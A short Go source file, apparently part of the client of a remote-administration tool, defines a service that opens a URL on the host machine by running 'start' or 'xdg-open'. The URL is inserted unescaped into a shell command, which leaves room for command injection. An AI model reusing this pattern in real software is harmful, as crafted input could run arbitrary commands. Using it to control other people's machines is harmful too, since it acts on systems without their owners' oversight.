package url

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/services/os"
	"strings"
)

type Service struct {
	Terminal services.Terminal
	OsType   os.OSType
}

func NewUrlService(terminalService services.Terminal, osType os.OSType) services.Url {
	return &Service{Terminal: terminalService, OsType: osType}
}

func (u Service) OpenUrl(url string) error {
	var cmdOut []byte
	switch u.OsType {
	case os.Windows:
		cmdOut, _ = u.Terminal.Run(fmt.Sprintf("start %s", url))
	case os.Linux:
		cmdOut, _ = u.Terminal.Run(fmt.Sprintf("xdg-open %s", url))
	default:
		return services.ErrUnsupportedPlatform
	}
	if strings.Contains(strings.ToLower(string(cmdOut)), "failed") {
		return fmt.Errorf("%s", cmdOut)
	}
	return nil
}
